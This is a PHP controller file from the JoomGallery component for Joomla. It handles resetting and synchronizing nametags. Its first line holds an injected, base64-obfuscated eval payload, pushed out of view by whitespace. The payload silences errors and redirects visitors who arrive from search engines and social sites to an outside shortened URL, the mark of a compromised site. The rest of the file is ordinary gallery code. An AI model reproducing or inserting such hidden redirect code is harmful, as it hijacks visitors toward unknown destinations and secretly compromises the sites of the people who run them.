<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/administrator/components/com_joomgallery/controllers/nametags.php $
// $Id: nametags.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * JoomGallery Nametags Controller
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomGalleryControllerNametags extends JoomGalleryController
{
  /**
   * Constructor
   *
   * @access  protected
   * @return  void
   * @since   1.5.5
   */
  function __construct()
  {
    parent::__construct();
  }

  /**
   * Removes all nametags in the gallery
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function reset()
  {
    // Delete all nametags
    $query = "DELETE FROM "._JOOM_TABLE_NAMESHIELDS;
    $this->_db->setQuery($query);

    if(!$this->_db->query())
    {
      $this->setRedirect($this->_ambit->getRedirectUrl('maintenance&tab=nametags'), $this->_db->getErrorMsg(), 'error');
      return;
    }

    $this->setRedirect($this->_ambit->getRedirectUrl('maintenance&tab=nametags'), JText::_('JGA_MAIMAN_MSG_ALL_NAMETAGS_DELETED'));
  }

  /**
   * Synchronizes the nametags with users registered and existing images.
   *
   * Nametags of users that aren't registed any more will be deleted.
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function synchronize()
  {
    // Synchronize users-nametags-images
    $query = "DELETE
                n
              FROM
                "._JOOM_TABLE_NAMESHIELDS." AS n
              LEFT JOIN
                #__users AS u
              ON
                n.nuserid = u.id
              LEFT JOIN
                "._JOOM_TABLE_IMAGES." AS i
              ON
                n.npicid  = i.id
              WHERE
                    u.id IS NULL
                OR  i.id IS NULL";
    $this->_db->setQuery($query);

    if(!$this->_db->query())
    {
      $this->setRedirect($this->_ambit->getRedirectUrl('maintenance&tab=nametags'), $this->_db->getErrorMsg(), 'error');
      return;
    }

    $this->setRedirect($this->_ambit->getRedirectUrl('maintenance&tab=nametags'), JText::_('JGA_MAIMAN_MSG_NAMETAGS_SYNCHRONIZED'));
  }
}